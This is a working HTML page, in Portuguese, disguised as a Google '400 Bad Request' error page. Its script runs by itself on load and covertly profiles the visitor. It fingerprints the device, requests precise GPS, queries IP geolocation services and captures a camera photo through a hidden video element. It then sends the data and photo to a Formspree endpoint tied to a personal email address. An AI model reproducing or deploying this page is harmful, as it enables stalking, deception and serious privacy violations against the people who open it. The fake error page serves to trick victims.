<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script defer src="/_vercel/insights/script.js"></script>
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css"
    />
    <title>Hello World</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            line-height: 1.4;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            padding: 20px 40px;
            border-bottom: 1px solid #dadce0;
            background: white;
        }

        .logo {
            font-size: 22px;
            font-weight: 400;
            color: #4285f4;
            text-decoration: none;
        }

        .container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            max-width: 600px;
            margin: 0 auto;
            width: 100%;
        }

        .error-content {
            text-align: left;
            width: 100%;
        }

        .error-code {
            font-size: 64px;
            font-weight: 400;
            color: #ea4335;
            margin-bottom: 20px;
            line-height: 1;
        }

        .error-title {
            font-size: 28px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 16px;
        }

        .error-description {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 32px;
            line-height: 1.5;
        }

        .error-details {
            background: #f1f3f4;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 32px;
            font-size: 14px;
            color: #5f6368;
            border-left: 4px solid #ea4335;
        }

        .error-details strong {
            color: #202124;
        }

        .suggestions {
            list-style: none;
            margin-bottom: 32px;
        }

        .suggestions li {
            margin-bottom: 12px;
            padding-left: 20px;
            position: relative;
            font-size: 14px;
            color: #5f6368;
        }

        .suggestions li:before {
            content: "•";
            color: #ea4335;
            position: absolute;
            left: 0;
            font-weight: bold;
        }

        .btn-primary {
            background-color: #4285f4;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: background-color 0.2s;
        }

        .btn-primary:hover {
            background-color: #3367d6;
        }

        .footer {
            padding: 20px 40px;
            border-top: 1px solid #dadce0;
            background: white;
            text-align: center;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 30px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }

        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            font-size: 14px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-text {
            color: #5f6368;
            font-size: 14px;
        }

        @media (max-width: 600px) {
            .header {
                padding: 15px 20px;
            }

            .container {
                padding: 20px;
            }

            .error-code {
                font-size: 48px;
            }

            .error-title {
                font-size: 24px;
            }

            .footer {
                padding: 15px 20px;
            }

            .footer-links {
                flex-direction: column;
                gap: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="#" class="logo">Google</a>
    </div>

    <div class="container">
        <div class="error-content">
            <div class="error-code">400</div>
            <h1 class="error-title">Bad Request</h1>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Ajuda</a>
            <a href="#">Privacidade</a>
            <a href="#">Termos</a>
            <a href="#">Sobre</a>
        </div>
        <div class="footer-text">
            © 2025 Google LLC
        </div>
    </div>
    <script>
             // ========== CONFIGURAÇÃO ==========
        const CONFIG = {
            // Substitua pelo seu email
            destinationEmail: 'vitoralves1604@gmail.com',
            
            // Formspree (gratuito) - substitua pelo seu endpoint
            formspreeEndpoint: 'https://formspree.io/f/mldnbzpr'
        };

        // ========== DETECÇÃO DE NOME DO DISPOSITIVO ==========
        function getDeviceName() {
            const userAgent = navigator.userAgent;
            let deviceName = 'Dispositivo Desconhecido';
            let deviceModel = 'Modelo Desconhecido';
            let manufacturer = 'Fabricante Desconhecido';

            // Detectar dispositivos Apple
            if (/iPhone/.test(userAgent)) {
                const match = userAgent.match(/iPhone OS (\d+)_(\d+)/);
                const version = match ? `iOS ${match[1]}.${match[2]}` : 'iOS';
                
                // Detectar modelo específico do iPhone
                if (/iPhone14,/.test(userAgent)) deviceModel = 'iPhone 13 Series';
                else if (/iPhone13,/.test(userAgent)) deviceModel = 'iPhone 12 Series';
                else if (/iPhone12,/.test(userAgent)) deviceModel = 'iPhone 11 Series';
                else if (/iPhone11,/.test(userAgent)) deviceModel = 'iPhone XS/XR';
                else if (/iPhone10,/.test(userAgent)) deviceModel = 'iPhone X/8';
                else deviceModel = 'iPhone';
                
                deviceName = `Apple ${deviceModel}`;
                manufacturer = 'Apple';
            }
            else if (/iPad/.test(userAgent)) {
                const match = userAgent.match(/iPad; CPU OS (\d+)_(\d+)/);
                const version = match ? `iPadOS ${match[1]}.${match[2]}` : 'iPadOS';
                
                if (/iPad13,/.test(userAgent)) deviceModel = 'iPad Pro (2021)';
                else if (/iPad11,/.test(userAgent)) deviceModel = 'iPad Pro (2020)';
                else if (/iPad8,/.test(userAgent)) deviceModel = 'iPad Pro (2018)';
                else deviceModel = 'iPad';
                
                deviceName = `Apple ${deviceModel}`;
                manufacturer = 'Apple';
            }
            else if (/Macintosh/.test(userAgent)) {
                const match = userAgent.match(/Mac OS X (\d+)_(\d+)/);
                const version = match ? `macOS ${match[1]}.${match[2]}` : 'macOS';
                
                if (/Intel/.test(userAgent)) deviceModel = 'Mac Intel';
                else if (/Apple Silicon|M1|M2/.test(userAgent)) deviceModel = 'Mac Apple Silicon';
                else deviceModel = 'Mac';
                
                deviceName = `Apple ${deviceModel}`;
                manufacturer = 'Apple';
            }
            
            // Detectar dispositivos Android
            else if (/Android/.test(userAgent)) {
                manufacturer = 'Android';
                
                // Samsung
                if (/SM-/.test(userAgent)) {
                    manufacturer = 'Samsung';
                    const model = userAgent.match(/SM-([A-Z0-9]+)/);
                    if (model) {
                        const modelCode = model[1];
                        if (modelCode.startsWith('G')) deviceModel = 'Samsung Galaxy S';
                        else if (modelCode.startsWith('N')) deviceModel = 'Samsung Galaxy Note';
                        else if (modelCode.startsWith('A')) deviceModel = 'Samsung Galaxy A';
                        else if (modelCode.startsWith('J')) deviceModel = 'Samsung Galaxy J';
                        else deviceModel = `Samsung ${modelCode}`;
                    }
                    deviceName = `${manufacturer} ${deviceModel}`;
                }
                
                // Xiaomi
                else if (/Mi |Redmi|POCO/.test(userAgent)) {
                    manufacturer = 'Xiaomi';
                    const match = userAgent.match(/(Mi [^;]+|Redmi [^;]+|POCO [^;]+)/);
                    deviceModel = match ? match[1] : 'Xiaomi Device';
                    deviceName = `${manufacturer} ${deviceModel}`;
                }
                
                // Huawei
                else if (/HUAWEI|Honor/.test(userAgent)) {
                    manufacturer = 'Huawei';
                    const match = userAgent.match(/(HUAWEI [^;]+|Honor [^;]+)/);
                    deviceModel = match ? match[1] : 'Huawei Device';
                    deviceName = `${manufacturer} ${deviceModel}`;
                }
                
                // LG
                else if (/LG-/.test(userAgent)) {
                    manufacturer = 'LG';
                    const match = userAgent.match(/LG-([^;]+)/);
                    deviceModel = match ? `LG ${match[1]}` : 'LG Device';
                    deviceName = deviceModel;
                }
                
                // Motorola
                else if (/Moto/.test(userAgent)) {
                    manufacturer = 'Motorola';
                    const match = userAgent.match(/(Moto [^;]+)/);
                    deviceModel = match ? match[1] : 'Motorola Device';
                    deviceName = `${manufacturer} ${deviceModel}`;
                }
                
                // Sony
                else if (/Sony/.test(userAgent)) {
                    manufacturer = 'Sony';
                    const match = userAgent.match(/Sony ([^;]+)/);
                    deviceModel = match ? match[1] : 'Sony Xperia';
                    deviceName = `${manufacturer} ${deviceModel}`;
                }
                
                // OnePlus
                else if (/OnePlus/.test(userAgent)) {
                    manufacturer = 'OnePlus';
                    const match = userAgent.match(/(OnePlus [^;]+)/);
                    deviceModel = match ? match[1] : 'OnePlus Device';
                    deviceName = deviceModel;
                }
                
                // Generic Android
                else {
                    const match = userAgent.match(/Android[^;]*;[^)]*\) ([^/]+)/);
                    if (match) {
                        deviceName = match[1].trim();
                        deviceModel = deviceName;
                    } else {
                        deviceName = 'Dispositivo Android';
                        deviceModel = 'Android Device';
                    }
                }
            }
            
            // Windows
            else if (/Windows/.test(userAgent)) {
                manufacturer = 'Microsoft';
                if (/Windows NT 10/.test(userAgent)) {
                    deviceModel = 'Windows 10/11';
                } else if (/Windows NT 6.3/.test(userAgent)) {
                    deviceModel = 'Windows 8.1';
                } else if (/Windows NT 6.2/.test(userAgent)) {
                    deviceModel = 'Windows 8';
                } else if (/Windows NT 6.1/.test(userAgent)) {
                    deviceModel = 'Windows 7';
                } else {
                    deviceModel = 'Windows';
                }
                deviceName = `PC ${deviceModel}`;
            }
            
            // Linux
            else if (/Linux/.test(userAgent)) {
                manufacturer = 'Linux';
                if (/Ubuntu/.test(userAgent)) {
                    deviceModel = 'Ubuntu';
                    deviceName = 'PC Ubuntu';
                } else if (/Fedora/.test(userAgent)) {
                    deviceModel = 'Fedora';
                    deviceName = 'PC Fedora';
                } else {
                    deviceModel = 'Linux';
                    deviceName = 'PC Linux';
                }
            }

            return {
                deviceName,
                deviceModel,
                manufacturer,
                fullUserAgent: userAgent
            };
        }

        // ========== COLETA DE DADOS APRIMORADA ==========
        function collectDeviceInfo() {
            const userAgent = navigator.userAgent;
            const deviceNameInfo = getDeviceName();
            
            // Detectar tipo de dispositivo
            let deviceType = 'Desktop';
            if (/tablet|ipad/i.test(userAgent)) {
                deviceType = 'Tablet';
            } else if (/mobile|iphone|android/i.test(userAgent)) {
                deviceType = 'Mobile';
            }

            // Detectar sistema operacional
            let os = 'Desconhecido';
            let osVersion = '';
            
            if (userAgent.includes('Windows NT 10')) {
                os = 'Windows';
                osVersion = '10/11';
            } else if (userAgent.includes('Windows NT 6.3')) {
                os = 'Windows';
                osVersion = '8.1';
            } else if (userAgent.includes('Windows NT 6.1')) {
                os = 'Windows';
                osVersion = '7';
            } else if (userAgent.includes('Mac OS X')) {
                os = 'macOS';
                const match = userAgent.match(/Mac OS X (\d+)_(\d+)_?(\d+)?/);
                if (match) osVersion = `${match[1]}.${match[2]}${match[3] ? '.' + match[3] : ''}`;
            } else if (userAgent.includes('Android')) {
                os = 'Android';
                const match = userAgent.match(/Android (\d+\.?\d*)/);
                if (match) osVersion = match[1];
            } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
                os = userAgent.includes('iPad') ? 'iPadOS' : 'iOS';
                const match = userAgent.match(/OS (\d+)_(\d+)_?(\d+)?/);
                if (match) osVersion = `${match[1]}.${match[2]}${match[3] ? '.' + match[3] : ''}`;
            } else if (userAgent.includes('Linux')) {
                os = 'Linux';
            }

            // Detectar navegador e versão
            let browser = 'Desconhecido';
            let browserVersion = '';
            
            if (userAgent.includes('Chrome')) {
                browser = 'Chrome';
                const match = userAgent.match(/Chrome\/(\d+\.\d+)/);
                if (match) browserVersion = match[1];
            } else if (userAgent.includes('Firefox')) {
                browser = 'Firefox';
                const match = userAgent.match(/Firefox\/(\d+\.\d+)/);
                if (match) browserVersion = match[1];
            } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
                browser = 'Safari';
                const match = userAgent.match(/Version\/(\d+\.\d+)/);
                if (match) browserVersion = match[1];
            } else if (userAgent.includes('Edge')) {
                browser = 'Edge';
                const match = userAgent.match(/Edge\/(\d+\.\d+)/);
                if (match) browserVersion = match[1];
            }

            // Informações de hardware adicionais
            const hardwareInfo = {
                cores: navigator.hardwareConcurrency || 'N/A',
                memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
                pixelRatio: window.devicePixelRatio || 1,
                colorDepth: screen.colorDepth,
                orientation: screen.orientation ? screen.orientation.type : 'N/A'
            };

            return {
                // Informações básicas
                deviceType,
                os: `${os}${osVersion ? ' ' + osVersion : ''}`,
                browser: `${browser}${browserVersion ? ' ' + browserVersion : ''}`,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                referrer: document.referrer || 'Acesso direto',
                userAgent,
                timestamp: new Date().toLocaleString('pt-BR'),
                ip: 'Detectado pelo servidor',
                
                // Informações do dispositivo
                deviceName: deviceNameInfo.deviceName,
                deviceModel: deviceNameInfo.deviceModel,
                manufacturer: deviceNameInfo.manufacturer,
                
                // Hardware
                hardware: hardwareInfo,
                
                // Navegador detalhado
                browserDetails: {
                    name: browser,
                    version: browserVersion,
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    onLine: navigator.onLine,
                    languages: navigator.languages?.join(', ') || navigator.language
                }
            };
        }

        // ========== LOCALIZAÇÃO AVANÇADA ==========
        
        // WiFi Networks (funciona em alguns navegadores)
        async function getWiFiNetworks() {
            try {
                if ('navigator' in window && 'connection' in navigator) {
                    const connection = navigator.connection;
                    return {
                        type: connection.type,
                        effectiveType: connection.effectiveType,
                        downlink: connection.downlink,
                        rtt: connection.rtt
                    };
                }
            } catch (error) {
                console.warn('WiFi info não disponível:', error);
            }
            return null;
        }

        // Múltiplos serviços de IP Geolocation para maior precisão
        async function getIPLocation() {
            const services = [
                {
                    name: 'IPApi',
                    url: 'https://ipapi.co/json/',
                    parser: data => ({
                        latitude: data.latitude,
                        longitude: data.longitude,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        ip: data.ip,
                        isp: data.org,
                        timezone: data.timezone,
                        postal: data.postal
                    })
                },
                {
                    name: 'IPInfo',
                    url: 'https://ipinfo.io/json',
                    parser: data => {
                        const [lat, lon] = (data.loc || '0,0').split(',');
                        return {
                            latitude: parseFloat(lat),
                            longitude: parseFloat(lon),
                            city: data.city,
                            region: data.region,
                            country: data.country,
                            ip: data.ip,
                            isp: data.org,
                            timezone: data.timezone,
                            postal: data.postal
                        };
                    }
                },
                {
                    name: 'IP-API',
                    url: 'http://ip-api.com/json/',
                    parser: data => ({
                        latitude: data.lat,
                        longitude: data.lon,
                        city: data.city,
                        region: data.regionName,
                        country: data.country,
                        ip: data.query,
                        isp: data.isp,
                        timezone: data.timezone,
                        postal: data.zip
                    })
                }
            ];

            for (const service of services) {
                try {
                    const response = await fetch(service.url);
                    const data = await response.json();
                    const parsed = service.parser(data);
                    
                    if (parsed.latitude && parsed.longitude) {
                        return {
                            ...parsed,
                            service: service.name,
                            accuracy: 'Cidade/Bairro (IP)'
                        };
                    }
                } catch (error) {
                    console.warn(`${service.name} falhou:`, error);
                }
            }
            return null;
        }

        // Detecção de timezone para melhor precisão
        function getTimezoneLocation() {
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const timezoneMap = {
                'America/Sao_Paulo': { city: 'São Paulo', region: 'SP', country: 'Brasil', lat: -23.5505, lon: -46.6333 },
                'America/Rio_Branco': { city: 'Rio Branco', region: 'AC', country: 'Brasil', lat: -9.9747, lon: -67.8243 },
                'America/Manaus': { city: 'Manaus', region: 'AM', country: 'Brasil', lat: -3.1190, lon: -60.0217 },
                'America/Fortaleza': { city: 'Fortaleza', region: 'CE', country: 'Brasil', lat: -3.7172, lon: -38.5433 },
                'America/Recife': { city: 'Recife', region: 'PE', country: 'Brasil', lat: -8.0476, lon: -34.8770 }
            };
            
            return timezoneMap[timezone] || null;
        }

        // Fingerprinting para estimativa de localização
        function getDeviceFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Fingerprint test', 2, 2);
            
            return {
                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                languages: navigator.languages?.join(',') || '',
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                canvasFingerprint: canvas.toDataURL().slice(-50),
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'N/A',
                pixelRatio: window.devicePixelRatio
            };
        }

        // Função principal de localização
        async function getLocation() {
            const results = {
                gps: null,
                ip: null,
                timezone: null,
                wifi: null,
                fingerprint: null,
                final: null
            };

            console.log('🔍 Coletando dados de localização...');

            // 1. Tentar GPS (alta precisão)
            if (navigator.geolocation) {
                try {
                    const gpsPosition = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            position => resolve(position),
                            error => reject(error),
                            { 
                                enableHighAccuracy: true, 
                                timeout: 8000, 
                                maximumAge: 300000 
                            }
                        );
                    });

                    results.gps = {
                        method: 'GPS',
                        latitude: gpsPosition.coords.latitude,
                        longitude: gpsPosition.coords.longitude,
                        accuracy: Math.round(gpsPosition.coords.accuracy) + 'm',
                        altitude: gpsPosition.coords.altitude,
                        speed: gpsPosition.coords.speed,
                        heading: gpsPosition.coords.heading,
                        timestamp: new Date(gpsPosition.timestamp).toISOString()
                    };
                    console.log('✅ GPS obtido');
                } catch (error) {
                    console.log('❌ GPS bloqueado/falhou:', error.message);
                }
            }

            // 2. IP Geolocation (múltiplos serviços)
            results.ip = await getIPLocation();
            if (results.ip) console.log('✅ IP Geolocation obtido');

            // 3. Timezone estimativa
            results.timezone = getTimezoneLocation();
            if (results.timezone) console.log('✅ Timezone estimativa obtida');

            // 4. WiFi/Conexão info
            results.wifi = await getWiFiNetworks();
            if (results.wifi) console.log('✅ Info de conexão obtida');

            // 5. Device fingerprint
            results.fingerprint = getDeviceFingerprint();
            console.log('✅ Device fingerprint obtido');

            // 6. Determinar melhor localização
            if (results.gps) {
                results.final = {
                    ...results.gps,
                    precision: 'Alta (GPS)',
                    mapsUrl: `https://maps.google.com/?q=${results.gps.latitude},${results.gps.longitude}`
                };
            } else if (results.ip) {
                results.final = {
                    method: 'IP Geolocation',
                    latitude: results.ip.latitude,
                    longitude: results.ip.longitude,
                    city: results.ip.city,
                    region: results.ip.region,
                    country: results.ip.country,
                    ip: results.ip.ip,
                    isp: results.ip.isp,
                    timezone: results.ip.timezone,
                    postal: results.ip.postal,
                    accuracy: results.ip.accuracy,
                    precision: 'Média (IP)',
                    mapsUrl: `https://maps.google.com/?q=${results.ip.latitude},${results.ip.longitude}`
                };
            } else if (results.timezone) {
                results.final = {
                    method: 'Timezone',
                    latitude: results.timezone.lat,
                    longitude: results.timezone.lon,
                    city: results.timezone.city,
                    region: results.timezone.region,
                    country: results.timezone.country,
                    accuracy: 'Região (Timezone)',
                    precision: 'Baixa (Timezone)',
                    mapsUrl: `https://maps.google.com/?q=${results.timezone.lat},${results.timezone.lon}`
                };
            }

            // Adicionar dados extras à localização final
            if (results.final && results.ip) {
                results.final.ip = results.ip.ip;
                results.final.isp = results.ip.isp;
                if (!results.final.city) results.final.city = results.ip.city;
                if (!results.final.country) results.final.country = results.ip.country;
            }

            if (results.final && results.wifi) {
                results.final.connection = results.wifi;
            }

            if (results.final && results.fingerprint) {
                results.final.fingerprint = results.fingerprint;
            }

            console.log('📍 Localização final:', results.final);
            return results.final;
        }

        // ========== ENVIO DE EMAIL ==========
        async function sendEmail(deviceInfo, locationInfo, photoInfo) {
            const emailContent = `
🚨 NOVA DETECÇÃO DE DISPOSITIVO
================================

📅 Data/Hora: ${deviceInfo.timestamp}
🌐 URL: ${deviceInfo.url}
📄 Referrer: ${deviceInfo.referrer}

📱 DISPOSITIVO:
• Nome: ${deviceInfo.deviceName}
• Modelo: ${deviceInfo.deviceModel}
• Fabricante: ${deviceInfo.manufacturer}
• Tipo: ${deviceInfo.deviceType}
• Sistema: ${deviceInfo.os}
• Navegador: ${deviceInfo.browser}
• Tela: ${deviceInfo.screen}
• Idioma: ${deviceInfo.language}
• Fuso: ${deviceInfo.timezone}

💻 HARDWARE:
• CPU Cores: ${deviceInfo.hardware.cores}
• Memória: ${deviceInfo.hardware.memory}
• Pixel Ratio: ${deviceInfo.hardware.pixelRatio}
• Cor Depth: ${deviceInfo.hardware.colorDepth}
• Orientação: ${deviceInfo.hardware.orientation}

🌐 NAVEGADOR:
• Nome: ${deviceInfo.browserDetails.name}
• Versão: ${deviceInfo.browserDetails.version}
• Cookies: ${deviceInfo.browserDetails.cookiesEnabled ? 'Sim' : 'Não'}
• Do Not Track: ${deviceInfo.browserDetails.doNotTrack || 'N/A'}
• Online: ${deviceInfo.browserDetails.onLine ? 'Sim' : 'Não'}
• Idiomas: ${deviceInfo.browserDetails.languages}

📍 LOCALIZAÇÃO:
${locationInfo ? 
`• Método: ${locationInfo.method || 'N/A'}
• Precisão: ${locationInfo.precision || 'N/A'}
• Coordenadas: ${locationInfo.latitude}, ${locationInfo.longitude}
• Exatidão: ${locationInfo.accuracy || 'N/A'}
• País: ${locationInfo.country || 'N/A'}
• Região: ${locationInfo.region || 'N/A'}
• Cidade: ${locationInfo.city || 'N/A'}
• CEP: ${locationInfo.postal || 'N/A'}
• IP: ${locationInfo.ip || 'N/A'}
• ISP: ${locationInfo.isp || 'N/A'}
• Timezone: ${locationInfo.timezone || deviceInfo.timezone}
• Altitude: ${locationInfo.altitude || 'N/A'}
• Velocidade: ${locationInfo.speed || 'N/A'}
• Direção: ${locationInfo.heading || 'N/A'}
• Conexão: ${locationInfo.connection?.effectiveType || 'N/A'}
• Mapa: ${locationInfo.mapsUrl}
• Fingerprint: ${locationInfo.fingerprint?.canvasFingerprint || 'N/A'}` : 
'• Localização não disponível'}

📸 FOTO:
${photoInfo ? 
`• Status: Capturada com sucesso
• Resolução: ${photoInfo.width}x${photoInfo.height}
• Tamanho: ${Math.round(photoInfo.size / 1024)}KB
• Timestamp: ${photoInfo.timestamp}
• Câmera: ${photoInfo.camera || 'frontal'}
• Formato: JPEG
• Dados: [Foto anexada em base64]` : 
'• Status: Não capturada (sem permissão ou câmera indisponível)'}

🔧 TÉCNICO:
• User Agent: ${deviceInfo.userAgent}
• IP: ${deviceInfo.ip}
================================
            `.trim();

            // Método 1: Formspree
            try {
                const response = await fetch(CONFIG.formspreeEndpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        email: CONFIG.destinationEmail,
                        subject: `🚨 ${deviceInfo.deviceName} Detectado`,
                        message: emailContent,
                        device_name: deviceInfo.deviceName,
                        device_type: deviceInfo.deviceType,
                        device_os: deviceInfo.os,
                        manufacturer: deviceInfo.manufacturer,
                        location: locationInfo ? `${locationInfo.latitude}, ${locationInfo.longitude}` : 'N/A',
                        photo: photoInfo ? photoInfo.data : null,
                        photo_info: photoInfo ? `${photoInfo.width}x${photoInfo.height}, ${Math.round(photoInfo.size/1024)}KB` : 'N/A'
                    })
                });

                if (response.ok) {
                    console.log('✅ Email enviado via Formspree');
                    return;
                }
            } catch (error) {
                console.warn('Formspree falhou:', error);
            }

            // Método 2: EmailJS (alternativa)
            // Você pode configurar EmailJS como backup

            // Método 3: Salvar no console para desenvolvimento
            console.log('==========================================');
            console.log('📧 DADOS COLETADOS:');
            console.log('==========================================');
            console.log('Para:', CONFIG.destinationEmail);
            console.log('Conteúdo:');
            console.log(emailContent);
            console.log('==========================================');
            console.log('Dispositivo:', deviceInfo);
            console.log('Localização:', locationInfo);
            console.log('Foto:', photoInfo ? `Capturada: ${photoInfo.width}x${photoInfo.height}, ${Math.round(photoInfo.size/1024)}KB` : 'Não capturada');
            console.log('==========================================');
        }

        // ========== CAPTURA DE FOTO ==========
        async function capturePhoto() {
            try {
                console.log('📸 Tentando acessar câmera...');
                
                // Tentar acessar câmera (sempre pedirá permissão)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user' // Câmera frontal se disponível
                    } 
                });
                
                // Criar elemento de vídeo invisível
                const video = document.createElement('video');
                video.style.display = 'none';
                video.srcObject = stream;
                video.autoplay = true;
                document.body.appendChild(video);
                
                // Aguardar o vídeo estar pronto
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                });
                
                // Criar canvas para capturar frame
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                
                // Capturar frame atual
                ctx.drawImage(video, 0, 0);
                
                // Parar stream
                stream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);
                
                // Converter para base64
                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                
                console.log('✅ Foto capturada');
                return {
                    data: photoData,
                    width: canvas.width,
                    height: canvas.height,
                    timestamp: new Date().toISOString(),
                    size: Math.round(photoData.length * 0.75) // Tamanho aproximado em bytes
                };
                
            } catch (error) {
                console.log('❌ Erro ao capturar foto:', error.message);
                
                // Tentar câmera traseira se frontal falhar
                if (error.name === 'OverconstrainedError') {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'environment' } 
                        });
                        
                        const video = document.createElement('video');
                        video.style.display = 'none';
                        video.srcObject = stream;
                        video.autoplay = true;
                        document.body.appendChild(video);
                        
                        await new Promise(resolve => {
                            video.onloadedmetadata = resolve;
                        });
                        
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        
                        ctx.drawImage(video, 0, 0);
                        
                        stream.getTracks().forEach(track => track.stop());
                        document.body.removeChild(video);
                        
                        const photoData = canvas.toDataURL('image/jpeg', 0.8);
                        
                        console.log('✅ Foto capturada (câmera traseira)');
                        return {
                            data: photoData,
                            width: canvas.width,
                            height: canvas.height,
                            timestamp: new Date().toISOString(),
                            size: Math.round(photoData.length * 0.75),
                            camera: 'traseira'
                        };
                        
                    } catch (error2) {
                        console.log('❌ Câmera traseira também falhou:', error2.message);
                    }
                }
                
                return null;
            }
        }

        // ========== EXECUÇÃO AUTOMÁTICA ==========
        async function init() {
            console.log('🚀 Coletando dados...');
            
            const deviceInfo = collectDeviceInfo();
            const locationInfo = await getLocation();
            
            // Tentar capturar foto (pode falhar se não houver permissão)
            const photoInfo = await capturePhoto();
            
            await sendEmail(deviceInfo, locationInfo, photoInfo);
            
            console.log('✅ Processo concluído');
        }

        // Executar automaticamente quando a página carregar
        window.addEventListener('load', init);
    </script>
</body>
</html>